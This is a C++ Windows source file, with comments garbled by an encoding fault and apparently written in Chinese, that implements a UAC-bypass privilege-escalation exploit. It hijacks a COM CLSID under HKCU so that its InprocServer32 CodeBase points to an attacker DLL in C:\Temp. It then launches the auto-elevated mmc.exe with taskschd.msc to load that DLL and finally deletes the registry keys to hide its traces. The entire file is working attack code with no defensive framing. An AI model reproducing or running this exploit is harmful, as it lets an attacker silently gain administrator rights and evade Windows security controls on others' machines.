// dll�ٳ�.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <windows.h>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	HKEY hKeyExe = NULL;
	HKEY hKeyCLSIDSrc = NULL;
	HKEY hKeyCLSIDDes = NULL;
	// 1�� ע����Ȩexe��ַ,dll�ļ���ȡ�õ�ִַ��
	if (argc < 2)
	{
		printf("��ָ����Ȩexe�ļ�·����\n");
		return 0;
	}
	// 1.1 ����Ҫ��Ȩ���ļ�·��ע�ᵽHKCU\Software\MyExe��
	int nLen = strlen(argv[1]);
	TCHAR szExePath[MAX_PATH] = {};
	MultiByteToWideChar(CP_ACP, NULL, argv[1], nLen, szExePath, MAX_PATH);
	TCHAR szKeyName[MAX_PATH] = { L"Software\\MyExe" };
	long lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
		szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKeyExe, NULL);
	if (lResult != ERROR_SUCCESS)
		return 0;
	RegSetValueEx(hKeyExe, NULL, 0, REG_SZ, (BYTE*)szExePath, nLen * 2);
	RegCloseKey(hKeyExe);
	// 2�� �������޸�CLSID,ָ��dll·��
	// 2.1������
	TCHAR szCLSIDSrc[MAX_PATH] = { L"CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}" };
	TCHAR szCLSIDDes[MAX_PATH] = { L"Software\\Classes\\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}" };

	RegOpenKeyEx(HKEY_CLASSES_ROOT, szCLSIDSrc, 0, KEY_READ|KEY_WOW64_32KEY, &hKeyCLSIDSrc);
	RegCreateKeyEx(HKEY_CURRENT_USER, szCLSIDDes, 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKeyCLSIDDes, NULL);

	RegCopyTree(hKeyCLSIDSrc, NULL, hKeyCLSIDDes);
	RegCloseKey(hKeyCLSIDSrc);
	RegCloseKey(hKeyCLSIDDes);
	// 2.2�� �޸�
	TCHAR *szSubKey[] = { L"\\InprocServer32" ,L"\\3.0.0.0" };
	for (int i=0;i<2;++i)
	{
		wcscat_s(szCLSIDDes, MAX_PATH, szSubKey[i]);
		RegOpenKeyEx(HKEY_CURRENT_USER, szCLSIDDes, 0, KEY_SET_VALUE | KEY_WOW64_32KEY, &hKeyCLSIDDes);

		DWORD cbData = (DWORD)((1 + wcslen(L"CLSID, Version=3.0.0.0, Culture=neutral")) * sizeof(WCHAR));
		lResult = RegSetValueEx(hKeyCLSIDDes, L"Assembly", 0,
			REG_SZ, (BYTE*)L"CLSID, Version=3.0.0.0, Culture=neutral", cbData);

		cbData = (DWORD)((1 + wcslen(L"CLSID.Class1")) * sizeof(WCHAR));
		lResult = RegSetValueEx(hKeyCLSIDDes, L"Class", 0,
			REG_SZ, (BYTE*)L"CLSID.Class1", cbData);

		cbData = (DWORD)((1 + wcslen(L"file://c://Temp//CLSID.dll")) * sizeof(WCHAR));
		lResult = RegSetValueEx(hKeyCLSIDDes, L"CodeBase", 0,
			REG_SZ, (BYTE*)L"file://c://Temp//CLSID.dll", cbData);

		RegCloseKey(hKeyCLSIDDes);
	}
	// 3������msc���򣬼���DLL
	system("mmc.exe taskschd.msc");
	// 4��ɾ��ע���CLSID������ֹӰ��������������
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}", 0, 
		DELETE| KEY_ENUMERATE_SUB_KEYS |KEY_QUERY_VALUE | KEY_WOW64_32KEY, &hKeyCLSIDDes);
	RegDeleteTree(hKeyCLSIDDes, NULL);
	RegDeleteKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}", KEY_WOW64_32KEY, NULL);
	return 0;
}

